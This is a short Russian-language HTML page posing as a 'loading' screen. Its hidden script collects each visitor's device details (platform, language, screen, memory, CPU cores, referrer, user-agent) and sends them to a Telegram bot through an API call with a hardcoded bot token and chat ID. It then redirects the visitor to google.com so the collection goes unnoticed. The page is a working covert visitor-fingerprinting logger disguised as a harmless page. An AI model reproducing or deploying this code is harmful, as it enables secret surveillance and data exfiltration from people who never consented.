<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <h2>Секунду, идет загрузка страницы...</h2>

    <script>
        const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
        const CHAT_ID = "8814781494";

        // Собираем базовую информацию без внешних запросов, которые могут блокироваться
        const info = "🚨 Новый посетитель на сайте!\n\n" +
                     "⏱ Время: " + new Date().toLocaleString() + "\n" +
                     "💻 Платформа: " + navigator.platform + "\n" +
                     "🗣 Язык: " + navigator.language + "\n" +
                     "📺 Экран: " + window.screen.width + "x" + window.screen.height + "\n" +
                     "🧠 Память (RAM): " + (navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно") + "\n" +
                     "⚙️ Ядра процессора: " + (navigator.hardwareConcurrency || "неизвестно") + "\n" +
                     "🔗 Источник: " + (document.referrer || "прямой заход") + "\n" +
                     "📱 User-Agent: " + navigator.userAgent;

        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info);

        // Отправляем запрос в Telegram, но НЕ ждем его завершения для редиректа,
        // чтобы страница не зависала, если Telegram или сеть заблокированы.
        fetch(url).catch(function() {});

        // Перенаправление на целевой сайт через 500 миллисекунд
        setTimeout(function() {
            window.location.href = "https://google.com";
        }, 500);
    </script>
